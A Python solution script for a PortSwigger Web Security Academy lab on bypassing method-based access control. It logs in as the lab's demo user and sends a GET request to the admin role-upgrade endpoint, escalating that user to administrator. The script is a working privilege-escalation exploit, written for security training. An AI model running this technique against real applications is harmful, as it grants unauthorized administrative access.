#!/usr/bin/env python3
# Lab: Method-based access control can be circumvented
# Lab-Link: https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented
# Difficulty: PRACTITIONER
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    client.get(host, allow_redirects=True)
    data = {'username': 'wiener', 'password': 'peter'}
    if 'Your username is: wiener' not in client.post(f'{host}/login', data=data).text:
        print(f'[-] Failed to login as wiener')
        sys.exit(-2)
    print(f'[+] Logged in as wiener')

    url = f'{host}/admin-roles?username=wiener&action=upgrade'
    if 'Congratulations, you solved the lab!' in client.get(url).text:
        print(f'[+] Successfully escalated privileges of wiener')
    else:
        print(f'[-] Failed to escalated privileges of wiener')


if __name__ == "__main__":
    main()
